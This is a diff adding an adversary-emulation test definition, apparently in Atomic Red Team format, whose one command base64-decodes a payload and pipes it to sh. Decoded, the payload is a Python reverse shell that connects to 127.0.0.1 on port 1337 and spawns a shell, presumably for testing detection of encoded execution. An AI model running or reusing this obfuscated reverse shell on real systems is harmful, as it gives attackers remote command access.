@@ -1,0 +1,13 @@
+attack_technique: Test
+display_name: Base64-encoded Python Script Execution
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  executor:
+    command: |
+      echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTI3LjAuMC4xIiwxMzM3KSk7W29zLmR1cDIocy5maWxlbm8oKSxmKWZvciBmIGluKDAsMSwyKV07cHR5LnNwYXduKCJzaCIpJyAyPi9kZXYvbnVsbA== | base64 -d | sh
+    name: bash
+    elevation_required: false
